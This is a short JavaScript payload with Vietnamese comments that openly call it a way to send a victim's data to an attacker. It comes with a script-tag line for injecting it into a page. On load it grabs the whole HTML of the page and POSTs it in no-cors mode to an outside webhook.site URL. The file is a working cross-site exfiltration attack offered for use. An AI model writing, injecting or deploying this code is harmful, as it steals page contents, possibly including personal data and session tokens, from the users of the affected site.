//file này có chức năng gửi toàn bộ thông tin của máy nạn nhân về cho kẻ tấn công thông qua dòng lệnh
//==========<script src="url/this_file"></script>
// 1. Định nghĩa "phương thức" gửi trộm
async function exfil(data) {
    await fetch('https://webhook.site/27fd40df-8ffe-4451-87b3-86125a4f0e3e', {
        method: 'POST', // Gửi dữ liệu đi (không phải lấy về)
        mode: 'no-cors', // Một kỹ thuật để gửi dữ liệu "bất chấp"
        body: data       // Nội dung cần gửi trộm
    })
}

// 2. Lấy dữ liệu và thực thi gửi trộm ngay lập tức
(async () => {
    // Lấy TOÀN BỘ mã HTML của trang web bạn đang xem
    let dataToSteal = document.documentElement.innerHTML;
    
    // Gọi hàm gửi trộm với dữ liệu vừa lấy được
    await exfil(dataToSteal);
})();